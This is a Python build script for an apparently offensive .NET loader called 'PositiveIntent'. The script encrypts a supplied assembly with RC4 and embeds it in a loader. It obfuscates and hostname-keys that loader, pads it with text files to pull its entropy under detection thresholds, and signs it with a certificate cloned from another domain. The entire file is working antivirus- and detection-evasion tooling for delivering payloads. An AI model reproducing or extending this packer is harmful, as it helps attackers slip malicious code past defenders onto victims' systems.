import sys
import argparse
import random
import traceback
import string
from modules import obfuscate
from modules import rc4
from modules import entropy
from modules import sign
import subprocess
import os
import colorama
import xml.etree.ElementTree as ET

def embed_book(resx_file_path, resource_name, text_file_path):

    # Parse the .resx file
    tree = ET.parse(resx_file_path)
    root = tree.getroot()

    # Create a new data element for the text file resource
    data = ET.Element("data")
    data.set("name", resource_name)
    data.set("xml:space", "preserve")

    # Add the value element (content of the text file)
    with open(text_file_path, 'r', encoding="utf-8") as f:
        value = ET.Element("value")
        value.text = f.read()

    data.append(value)
    
    # Append the new resource to the root element
    root.append(data)

    # Write the updated .resx file
    tree.write(resx_file_path, encoding="utf-8", xml_declaration=True)

def build(assembly_name):

    assembly_output_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp/PositiveIntent/bin/Release/net48/{assembly_name}.exe"))
    solution_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp/PositiveIntent.sln"))
    resources_directory_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp/PositiveIntent/Resources"))
    resources_file_path = os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), "temp/PositiveIntent/Properties/Resources.resx"))
    embed_count = 0

    print(colorama.Fore.YELLOW + "[*] " + colorama.Style.RESET_ALL + f'Building loader and adjusting entropy...please hold.')

    if sys.platform == 'win32':
        subprocess.run(["dotnet", "build", "--configuration", "Release", solution_path], check=True, stdout = subprocess.DEVNULL)
    else:
        subprocess.run(["msbuild", solution_path, "-r:true", "-p:Configuration=Release"], check=True, stdout = subprocess.DEVNULL)

    if(entropy.run(assembly_output_path) > 5.50):
        for root, dirs, files in os.walk(resources_directory_path, topdown=True):
            for file_name in files:
                if file_name.endswith('.txt'):
                    file_path = os.path.join(root, file_name)
                    embed_book(resources_file_path, file_name, file_path)
                    embed_count += 1
                    if sys.platform == 'win32':
                        subprocess.run(["dotnet", "build", "--configuration", "Release", solution_path], check=True, stdout = subprocess.DEVNULL)
                    else:
                        subprocess.run(["msbuild", solution_path, "-r:true", "-p:Configuration=Release"], check=True, stdout = subprocess.DEVNULL)
                    if(4.50 <= entropy.run(assembly_output_path) <= 5.50):
                        break
            else:
                continue
            break

    if(embed_count > 0):
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Embedded {embed_count} books as resource files')
    if(entropy.run(assembly_output_path) > 5.50 or entropy.run(assembly_output_path) < 4.50):
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to normalize entropy. Need more books! Entropy of loader: {entropy.run(assembly_output_path)}. You can still run the loader at your own risk.')
    else:
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Entropy of loader: {entropy.run(assembly_output_path)}')

    return assembly_name

if __name__=="__main__":

    if sys.platform == 'win32':
        colorama.init()
    
    # parse arguments
    parser = argparse.ArgumentParser(description='PositiveIntent .NET Loader')
    parser.add_argument('--file', type=argparse.FileType('rb'),
                        required=True, help='Path to your .NET assembly (e.g. Seeker.exe).')
    parser.add_argument('--hostname', type=str, required=True,
                        help='Restrict execution of loader to hostname.')
    parser.add_argument('--domain', type=str, required=True,
                        help='Domain to copy certificate from. Used to generate a self-signed certificate and digitally sign the loader.')
    parser.add_argument('--args', type=str, required=False,
                        help='Hardcoded arguments to be passed to your assembly. Useful to avoid passing signatured arguments on the command line.')
    parser.add_argument('--writetofile', action='store_true', required=False,
                        help='Redirect output of assembly to encrypted file (C:/Windows/Temp/log.txt). Useful to avoid outputting signatured text to console (e.g. tool logos).')
    args = parser.parse_args()
   
    # obfuscate loader source
    # key on hostname
    # randomize assembly name
    try:
        if(args.args and not args.writetofile):
            assembly_name, key = obfuscate.run(args.hostname, args.args, None)
        elif(args.writetofile and not args.args):
            assembly_name, key = obfuscate.run(args.hostname, None, args.writetofile)
        elif(args.args and args.writetofile):
            assembly_name, key = obfuscate.run(args.hostname, args.args, args.writetofile)
        else:
            assembly_name, key = obfuscate.run(args.hostname, None, None)
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Obfuscated loader source files')
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Keyed on hostname {args.hostname}')
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Randomized loader filename")
    except Exception as exception: # is this error handling?
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to obfuscate source files')
        print(traceback.print_exc())
        sys.exit(-1)

    # encrypt .NET assembly and embed as a resource file
    try:
        rc4.run(args.file, key.encode('utf-8'))
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f"Encrypted and embedded {args.file.name} as a resource file")
        if(args.writetofile):
            print(colorama.Fore.BLUE + "[*] " + colorama.Style.RESET_ALL + f"Your decryption key is {key}")
    except Exception as exception: # we're really doing this
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to encrypt and embed .NET assembly')
        print(traceback.print_exc())
        sys.exit(-1)

    # build loader and adjust entropy
    try:
        build(assembly_name)
    except Exception as exception:
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to build loader.')
        print(traceback.print_exc())
        sys.exit(-1)

    # digitally sign loader executable
    try:
        sign.run(args.domain, assembly_name)
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + f'Signed loader with certificate cloned from {args.domain}')
        print(colorama.Fore.GREEN + "[+] " + colorama.Style.RESET_ALL + 'Loader compiled to ' + os.path.normpath(os.path.join(os.path.dirname(os.path.abspath(__file__)), f"temp/{assembly_name}.exe")))
    except Exception as exception:
        print(colorama.Fore.RED + "[-] " + colorama.Style.RESET_ALL + f'Failed to digitally sign loader')
        print(traceback.print_exc())
        sys.exit(-1)
